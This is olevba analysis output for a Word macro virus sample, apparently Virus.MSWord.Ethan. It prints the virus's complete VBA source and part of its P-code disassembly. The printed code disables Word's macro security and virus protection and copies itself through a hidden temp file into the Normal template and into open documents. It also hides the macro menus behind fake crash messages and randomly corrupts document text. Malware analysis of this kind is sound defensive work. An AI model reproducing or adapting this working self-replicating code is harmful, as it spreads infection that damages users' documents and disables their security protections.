olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.dh
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDoc.cls 
in file: Virus.MSWord.Ethan.dh - OLE stream: 'Macros/VBA/ThisDoc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
  CommandBars("Macro").Controls("Security...").Enabled = False
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
  Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If

Application.EnableCancelKey = Not -1
CountofDocs = Documents.Count
For Doc = 0 To CountofDocs
If Documents.Item(Doc).VBProject.VBComponents.Item(1).Name <> "ThisDoc" Then
Set t = Documents.Item(Doc).VBProject.VBComponents.Item(1)

s = Documents.Item(Doc).Saved

begin = 1
If t.CodeModule.Find("Document_Open()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
ElseIf t.CodeModule.Find("Document_Close()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ToolsMacro()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("Filetemplates()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ViewVBCode()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
End If
End If
End If
End If

Open "c:\hawk.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
t.Name = "ThisDoc"
If Left(Documents.Item(Doc).Name, 8) <> "Document" Then Documents.Item(Doc).SaveAs FileName:=ActiveDocument.FullName
If Documents.Item(Doc).Saved <> s Then Documents.Item(Doc).Saved = s
End If
Next Doc

SetAttr "c:\hawk.___", 0
Kill "c:\hawk.___"
End Sub

Private Sub Document_Open()

On Error Resume Next

Randomize

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
  CommandBars("Macro").Controls("Security...").Enabled = False
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
  Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If

If Dir("c:\hawk.___", 6) = "" Then
Open "c:\hawk.___" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\hawk.___", 6
End If

If NormalTemplate.VBProject.VBComponents.Item(1).Name <> "ThisDoc" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)

begin = 1
If t.CodeModule.Find("Document_Open()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("Document_Close()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ToolsMacro()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("Filetemplates()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ViewVBCode()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
End If
End If
End If
End If
End If

Open "c:\hawk.___" For Input As #1
If LOF(1) = 0 Then GoTo x
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
x:
Close #1
t.Name = "ThisDoc"
ElseIf Rnd < 0.1 And Year(Now) = 2000 Then
With ActiveDocument.Content.Find:
    .ClearFormatting
    .Text = "e"
    .MatchCase = False
    .Replacement.ClearFormatting
    .Replacement.Font.Bold = True
    .Replacement.Text = "#5 -"
    .Execute Forward:=True, MatchCase:=False, Replace:=wdReplaceAll
End With
With ActiveDocument.Content.Find:
    .ClearFormatting
    .Text = "n"
    .MatchCase = False
    .Replacement.ClearFormatting
    .Replacement.Font.Bold = True
    .Replacement.Text = "-& "
    .Execute Forward:=True, MatchCase:=False, Replace:=wdReplaceAll
End With
With ActiveDocument.Content.Find:
    .ClearFormatting
    .Text = "."
    .MatchCase = False
    .Replacement.ClearFormatting
    .Replacement.Font.Bold = True
    .Replacement.Text = "31"
    .Execute Forward:=True, MatchCase:=False, Replace:=wdReplaceAll
End With
Selection.Next(Unit:=wdParagraph, Count:=1).Select
Selection.Delete
End If

CountofDocs = Documents.Count
For Doc = 0 To CountofDocs
If Documents.Item(Doc).VBProject.VBComponents.Item(1).Name <> "ThisDoc" Then
Set t = Documents.Item(Doc).VBProject.VBComponents.Item(1)
s = Documents.Item(Doc).Saved
begin = 1
If t.CodeModule.Find("Document_Open()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
ElseIf t.CodeModule.Find("Document_Close()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ToolsMacro()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("Filetemplates()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ViewVBCode()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
End If
End If
End If
End If

Open "c:\hawk.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
t.Name = "ThisDoc"
If Left(Documents.Item(Doc).Name, 8) <> "Document" Then Documents.Item(Doc).SaveAs FileName:=ActiveDocument.FullName
If Documents.Item(Doc).Saved <> s Then Documents.Item(Doc).Saved = s
End If
Next Doc

End Sub

Private Sub ToolsMacro()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
End Sub

Private Sub Filetemplates()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
End Sub

Private Sub ViewVBCode()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.dh
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDoc - 12167 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' Line #3:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #4:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #5:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #6:
' 	ElseBlock 
' Line #7:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	EndIfBlock 
' Line #9:
' Line #10:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #11:
' 	Ld Documents 
' 	MemLd Count 
' 	St CountofDocs 
' Line #12:
' 	StartForVariable 
' 	Ld Doc 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld CountofDocs 
' 	For 
' Line #13:
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "ThisDoc"
' 	Ne 
' 	IfBlock 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #15:
' Line #16:
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	St s 
' Line #17:
' Line #18:
' 	LitDI2 0x0001 
' 	St begin 
' Line #19:
' 	LitStr 0x000F "Document_Open()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #20:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #21:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #22:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #23:
' 	LitStr 0x0010 "Document_Close()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #25:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #26:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	ElseBlock 
' Line #28:
' 	LitDI2 0x0001 
' 	St begin 
' Line #29:
' 	LitStr 0x000C "ToolsMacro()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #30:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #31:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #32:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	ElseBlock 
' Line #34:
' 	LitDI2 0x0001 
' 	St begin 
' Line #35:
' 	LitStr 0x000F "Filetemplates()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #37:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #38:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	ElseBlock 
' Line #40:
' 	LitDI2 0x0001 
' 	St begin 
' Line #41:
' 	LitStr 0x000C "ViewVBCode()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #42:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #43:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #44:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' Line #50:
' 	LitStr 0x000B "c:\hawk.___"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #51:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo q 
' 	EndIf 
' Line #52:
' 	LitDI2 0x0001 
' 	St i 
' Line #53:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #54:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #55:
' 	Ld i 
' 	Ld a 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #56:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #57:
' 	Loop 
' Line #58:
' 	Label q 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #60:
' 	LitStr 0x0007 "ThisDoc"
' 	Ld t 
' 	MemSt New 
' Line #61:
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #62:
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Saved 
' 	EndIf 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	StartForVariable 
' 	Ld Doc 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' Line #66:
' 	LitStr 0x000B "c:\hawk.___"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #67:
' 	LitStr 0x000B "c:\hawk.___"
' 	ArgsCall Kill 0x0001 
' Line #68:
' 	EndSub 
' Line #69:
' Line #70:
' 	FuncDefn (Private Sub Document_Open())
' Line #71:
' Line #72:
' 	OnError (Resume Next) 
' Line #73:
' Line #74:
' 	ArgsCall Read 0x0000 
' Line #75:
' Line #76:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #77:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #78:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #79:
' 	ElseBlock 
' Line #80:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #81:
' 	EndIfBlock 
' Line #82:
' Line #83:
' 	LitStr 0x000B "c:\hawk.___"
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #84:
' 	LitStr 0x000B "c:\hawk.___"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #85:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #86:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' Line #88:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #90:
' 	LitStr 0x000B "c:\hawk.___"
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #91:
' 	EndIfBlock 
' Line #92:
' Line #93:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "ThisDoc"
' 	Ne 
' 	IfBlock 
' Line #94:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #95:
' Line #96:
' 	LitDI2 0x0001 
' 	St begin 
' Line #97:
' 	LitStr 0x000F "Document_Open()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #98:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #99:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #100:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #101:
' 	ElseBlock 
' Line #102:
' 	LitDI2 0x0001 
' 	St begin 
' Line #103:
' 	LitStr 0x0010 "Document_Close()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #104:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #105:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #106:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	ElseBlock 
' Line #108:
' 	LitDI2 0x0001 
' 	St begin 
' Line #109:
' 	LitStr 0x000C "ToolsMacro()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #110:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #111:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #112:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #113:
' 	ElseBlock 
' Line #114:
' 	LitDI2 0x0001 
' 	St begin 
' Line #115:
' 	LitStr 0x000F "Filetemplates()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #116:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #117:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #118:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #119:
' 	ElseBlock 
' Line #120:
' 	LitDI2 0x0001 
' 	St begin 
' Line #121:
' 	LitStr 0x000C "ViewVBCode()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #122:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #123:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #124:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	EndIfBlock 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	EndIfBlock 
' Line #130:
' Line #131:
' 	LitStr 0x000B "c:\hawk.___"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #132:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo x 
' 	EndIf 
' Line #133:
' 	LitDI2 0x0001 
' 	St i 
' Line #134:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #135:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #136:
' 	Ld i 
' 	Ld a 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #137:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #138:
' 	Loop 
' Line #139:
' 	Label x 
' Line #140:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #141:
' 	LitStr 0x0007 "ThisDoc"
' 	Ld t 
' 	MemSt New 
' Line #142:
' 	Ld Rnd 
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	Lt 
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D0 
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #143:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	MemLd Find 
' 	With 
' 	BoS 0x0000 
' Line #144:
' 	ArgsMemCallWith ClearFormatting 0x0000 
' Line #145:
' 	LitStr 0x0001 "e"
' 	MemStWith Then 
' Line #146:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #147:
' 	MemLdWith Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #148:
' 	LitVarSpecial (True)
' 	MemLdWith Replacement 
' 	MemLd Font 
' 	MemSt Bold 
' Line #149:
' 	LitStr 0x0004 "#5 -"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #150:
' 	LitVarSpecial (True)
' 	ParamNamed Forward 
' 	LitVarSpecial (False)
' 	ParamNamed MatchCase 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	ArgsMemCallWith Execute 0x0003 
' Line #151:
' 	EndWith 
' Line #152:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	MemLd Find 
' 	With 
' 	BoS 0x0000 
' Line #153:
' 	ArgsMemCallWith ClearFormatting 0x0000 
' Line #154:
' 	LitStr 0x0001 "n"
' 	MemStWith Then 
' Line #155:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #156:
' 	MemLdWith Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #157:
' 	LitVarSpecial (True)
' 	MemLdWith Replacement 
' 	MemLd Font 
' 	MemSt Bold 
' Line #158:
' 	LitStr 0x0003 "-& "
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #159:
' 	LitVarSpecial (True)
' 	ParamNamed Forward 
' 	LitVarSpecial (False)
' 	ParamNamed MatchCase 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	ArgsMemCallWith Execute 0x0003 
' Line #160:
' 	EndWith 
' Line #161:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	MemLd Find 
' 	With 
' 	BoS 0x0000 
' Line #162:
' 	ArgsMemCallWith ClearFormatting 0x0000 
' Line #163:
' 	LitStr 0x0001 "."
' 	MemStWith Then 
' Line #164:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #165:
' 	MemLdWith Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #166:
' 	LitVarSpecial (True)
' 	MemLdWith Replacement 
' 	MemLd Font 
' 	MemSt Bold 
' Line #167:
' 	LitStr 0x0002 "31"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #168:
' 	LitVarSpecial (True)
' 	ParamNamed Forward 
' 	LitVarSpecial (False)
' 	ParamNamed MatchCase 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
